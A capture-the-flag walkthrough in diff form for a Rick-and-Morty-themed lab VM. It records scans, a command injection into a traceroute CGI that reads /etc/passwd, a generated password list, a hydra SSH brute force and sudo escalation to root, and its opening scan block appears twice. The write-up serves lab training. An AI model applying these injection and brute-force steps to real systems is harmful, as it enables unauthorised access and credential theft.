@@ -1,0 +1,225 @@
+Fedora
+Kernel 4.11.8-300
+
+nmap 192.168.56.103 -Pn -p- -sV
+Nmap scan report for 192.168.56.103
+Host is up (0.00082s latency).
+Not shown: 65528 closed tcp ports (conn-refused)
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh?
+80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
+9090/tcp  open  http    Cockpit web service 161 or earlier
+13337/tcp open  unknown
+22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+60000/tcp open  unknown
+3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22-TCP:V=7.94%I=7%D=10/27%Time=653B424D%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.
+SF:4\.0-31-generic\x20x86_64\)\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port13337-TCP:V=7.94%I=7%D=10/27%Time=653B424D%P=x86_64-pc-linux-gnu%r(
+SF:NULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port60000-TCP:V=7.94%I=7%D=10/27%Time=653B4253%P=x86_64-pc-linux-gnu%r(
+SF:NULL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\
+SF:.\.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20r
+SF:everse\x20shell\.\.\.\n#\x20");
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.16 seconds
+
+Browser :https://192.168.56.103:9090/ - FLAG {There is no Zeus, in your face!} - 10 Points
+nc 192.168.56.103 13337 - FLAG:{TheyFoundMyBackDoorMorty}- 10Points
+nc 192.168.56.103 60000 - FLAG{Flip the pickle Morty!} - 10 Points
+ftp> open 192.168.56.103 - ID Anonymous Pass: Anonymous - FLAG{Whoa this is unexpected} - 10 Points
+nikto -host 192.168.56.103
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.103
++ Target Hostname:    192.168.56.103
++ Target Port:        80
++ Start Time:         2023-10-27 01:23:47 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.27 (Fedora)
+Fedora
+Kernel 4.11.8-300
+
+nmap 192.168.56.103 -Pn -p- -sV
+Nmap scan report for 192.168.56.103
+Host is up (0.00082s latency).
+Not shown: 65528 closed tcp ports (conn-refused)
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh?
+80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
+9090/tcp  open  http    Cockpit web service 161 or earlier
+13337/tcp open  unknown
+22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+60000/tcp open  unknown
+3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22-TCP:V=7.94%I=7%D=10/27%Time=653B424D%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.
+SF:4\.0-31-generic\x20x86_64\)\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port13337-TCP:V=7.94%I=7%D=10/27%Time=653B424D%P=x86_64-pc-linux-gnu%r(
+SF:NULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port60000-TCP:V=7.94%I=7%D=10/27%Time=653B4253%P=x86_64-pc-linux-gnu%r(
+SF:NULL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\
+SF:.\.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20r
+SF:everse\x20shell\.\.\.\n#\x20");
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.16 seconds
+
+Browser :https://192.168.56.103:9090/ - FLAG {There is no Zeus, in your face!} - 10 Points
+nc 192.168.56.103 13337 - FLAG:{TheyFoundMyBackDoorMorty}- 10Points
+nc 192.168.56.103 60000 - FLAG{Flip the pickle Morty!} - 10 Points
+ftp> open 192.168.56.103 - ID Anonymous Pass: Anonymous - FLAG{Whoa this is unexpected} - 10 Points
+nikto -host 192.168.56.103
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.103
++ Target Hostname:    192.168.56.103
++ Target Port:        80
++ Start Time:         2023-10-27 01:23:47 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.27 (Fedora)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/mis>
++ Apache/2.4.27 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE .
++ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
++ /passwords/: Directory indexing found.
++ /passwords/: This might be interesting.
++ /icons/: Directory indexing found.
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ 8908 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2023-10-27 01:24:23 (GMT-4) (36 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+ 
+Browser :http://192.168.56.103/passwords/FLAG.txt - FLAG{Yeah d- just don't do it.} - 10 Points
+Browser :http://192.168.56.103/passwords/passwords.html - Password: winter
+ 
+sudo dirb http://192.168.56.103 /usr/share/wordlists/dirb/common.txt
+ 
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+ 
+START_TIME: Fri Oct 27 02:53:47 2023
+URL_BASE: http://192.168.56.103/
+WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
+ 
+-----------------
+ 
+GENERATED WORDS: 4612
+ 
+---- Scanning URL: http://192.168.56.103/ ----
++ http://192.168.56.103/cgi-bin/ (CODE:403|SIZE:217)
++ http://192.168.56.103/index.html (CODE:200|SIZE:326)
+==> DIRECTORY: http://192.168.56.103/passwords/
++ http://192.168.56.103/robots.txt (CODE:200|SIZE:126)
+
+---- Entering directory: http://192.168.56.103/passwords/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+END_TIME: Fri Oct 27 02:53:53 2023
+DOWNLOADED: 4612 - FOUND: 3
+
+Browser: http://192.168.56.103/robots.txt - http://192.168.56.103/cgi-bin/tracertool.cgi
+192.168.56.103;tail /etc/passwd
+
+traceroute to 192.168.56.103 (192.168.56.103), 30 hops max, 60 byte packets
+ 1  localhost.localdomain (192.168.56.103)  0.020 ms  0.002 ms  0.002 ms
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+chrony:x:995:993::/var/lib/chrony:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
+Morty:x:1001:1001::/home/Morty:/bin/bash
+Summer:x:1002:1002::/home/Summer:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+
+ssh Summer@192.168.56.103 -p 22222 -v
+Password: winter
+tail FLAG.txt - FLAG{Get off the high road Summer!} - 10 Points
+
+sudo scp -P 22222 Summer@192.168.56.103:/home/Morty/Safe_Password.jpg .
+strings Safe_Password.jpg
+JFIF
+Exif
+8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
+
+sudo scp -P 22222 Summer@192.168.56.103:/home/Morty/journal.txt.zip .
+unzip journal.txt.zip - Password: Meeseek
+cat journal.txt
+Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? O>
+
+Anyway. Here it is:
+
+FLAG: {131333} - 20 Points
+
+[Summer@localhost RICKS_SAFE]$ cp safe /tmp/safe
+[Summer@localhost tmp]$ ./safe 131333
+decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
+
+Ricks password hints:
+ (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
+Follow these clues, in order
+
+
+1 uppercase character
+1 digit
+One of the words in my old bands name.  @
+
+Browser: search rick shancez old band name > the Flesh Curtains
+
+nano openSesame.py
+from string import ascii_uppercase
+
+for c in ascii_uppercase:
+    for x in range(10):
+        print(str(c) + str(x) + "Flesh")
+        print(str(c) + str(x) + "Curtains")
+
+python openSesame.py - output save to password.txt
+
+
+
+sudo hydra -l RickSanchez -P password  -t4 -f -s 22222 192.168.56.103 ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-27 05:32:23
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 520 login tries (l:1/p:520), ~130 tries per task
+[DATA] attacking ssh://192.168.56.103:22222/
+[STATUS] 44.00 tries/min, 44 tries in 00:01h, 476 to do in 00:11h, 4 active
+[STATUS] 34.67 tries/min, 104 tries in 00:03h, 416 to do in 00:13h, 4 active
+[STATUS] 29.14 tries/min, 204 tries in 00:07h, 316 to do in 00:11h, 4 active
+[22222][ssh] host: 192.168.56.103   login: RickSanchez   password: P7Curtains
+[STATUS] attack finished for 192.168.56.103 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-27 05:43:04
+
+sudo ssh RickSanchez@192.168.56.103 -p 22222 -v
+Password: P7Curtains
+
+[RickSanchez@localhost ~]$ sudo su
+Password: P7Curtains
+[root@localhost RickSanchez]# cd
+[root@localhost ~]# ls
+anaconda-ks.cfg  FLAG.txt
+
+[root@localhost ~]# tail FLAG.txt
+FLAG: {Ionic Defibrillator} - 30 points
